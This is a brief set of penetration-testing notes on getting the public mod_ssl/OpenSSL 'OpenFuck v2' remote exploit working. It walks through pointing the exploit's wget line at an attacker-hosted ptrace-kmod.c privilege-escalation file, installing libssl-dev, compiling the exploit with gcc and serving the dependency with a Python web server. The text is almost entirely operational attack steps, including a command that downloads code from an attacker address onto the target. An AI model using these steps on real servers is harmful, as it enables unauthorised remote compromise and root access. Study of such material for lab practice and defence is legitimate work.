# pentest
 
**mod_ssl 2.8.7 open ssl exploit (openfuckv2)** (https://www.exploit-db.com/exploits/764)

1. Change location for **ptrace-kmod.c**
at about line 672 - update download location for ptrace-kmod.c file. Ideally, you can host this file on your webserver (eg. attacking machine SimpleHTTPServer) so that when you execute the exploit it will retrieve this dependency to run successfully.
`wget http://your-attacking-ipaddress/ptrace-kmod.c;`

2. install libssl-dev
`apt-get install libssl-dev`

3. compile code
`gcc -o openfuck openfuckV2.c -lcrypto`

4. In your ptrace-kmod.c directory start webserver
`python -m SimpleHTTPServer 80`
